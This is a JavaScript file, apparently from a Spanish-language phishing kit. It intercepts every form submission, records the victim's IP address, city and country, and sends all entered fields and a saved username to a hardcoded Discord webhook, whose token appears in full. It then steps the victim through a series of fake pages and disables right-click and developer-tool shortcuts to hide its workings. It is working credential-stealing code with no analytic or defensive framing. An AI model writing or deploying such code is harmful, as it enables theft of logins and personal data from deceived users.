
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1516266080891441314/Qym9McRE4-k6OZc7g8Cq7VQiP4FjHYc22fvosM2J73RXHmj9o20J3uMDLwVnFTVcZCtT';

const pageFlow = [
  'index2.html',
  'index4.html',
  'index5.html',
  'index3.html',
  'success'
];


async function getLocation() {
  try {
    const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
    if (!res.ok) throw new Error('ipapi.co falló');
    const data = await res.json();
    return {
      ip: data.ip || 'Desconocida',
      city: data.city || 'Desconocida',
      country: data.country_name || data.country || 'Desconocido'
    };
  } catch (error) {
    console.warn('ipapi.co no responde, usando ip-api.com...', error);
    try {
      const res = await fetch('https://ip-api.com/json/?fields=query,city,country');
      const data = await res.json();
      return {
        ip: data.query || 'Desconocida',
        city: data.city || 'Desconocida',
        country: data.country || 'Desconocido'
      };
    } catch (e) {
      console.warn('Todos los servicios de geolocalización fallaron:', e);
      return { ip: 'No disponible', city: 'No disponible', country: 'No disponible' };
    }
  }
}


async function sendToDiscord(data, location, currentPage) {
  // Recuperar usuario guardado en localStorage
  const storedUsername = localStorage.getItem('username') || '';

  // Construir campos del embed
  const fields = Object.entries(data).map(([key, value]) => ({
    name: key.charAt(0).toUpperCase() + key.slice(1),
    value: value || '(vacío)',
    inline: true
  }));

  fields.push({
    name: '📍 Ubicación',
    value: `IP: ${location.ip} | Ciudad: ${location.city} | País: ${location.country}`,
    inline: false
  });

  if (storedUsername) {
    fields.push({
      name: '👤 Usuario asociado',
      value: storedUsername,
      inline: false
    });
  }

  let stepTitle = '📝 Nuevo registro';
  const pageName = currentPage.split('/').pop();
  const stepIndex = pageFlow.indexOf(pageName);
 

  const embed = {
    color: 0x2b2d42,
    fields: fields,
    timestamp: new Date().toISOString()
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
      keepalive: true
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Error HTTP de Discord:', response.status, errorText);
    } else {
      console.log('✅ Mensaje enviado a Discord correctamente');
    }
  } catch (error) {
    console.error('Fallo al enviar a Discord:', error);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const form = document.querySelector('form');
  if (!form) return;

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const formData = new FormData(form);
    const data = {};
    let username = '';

    formData.forEach((value, key) => {
      data[key] = value;
      if (['usuario', 'username', 'user'].includes(key.toLowerCase())) {
        username = value;
      }
    });

    if (!username && data.nombre) username = data.nombre;

    if (username) {
      localStorage.setItem('username', username);
    }

    const location = await getLocation();
    const currentPage = window.location.pathname;

    sendToDiscord(data, location, currentPage);

    const current = currentPage.split('/').pop();
    const idx = pageFlow.indexOf(current);
    const next = (idx >= 0 && idx < pageFlow.length - 1)
      ? pageFlow[idx + 1]
      : pageFlow[0];

    window.location.href = `cargando.html?next=${encodeURIComponent(next)}`;
  });
});


document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('keydown', e => {
    if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i' || e.key === 'j')) e.preventDefault();
    if (e.key === 'F12') e.preventDefault();
});
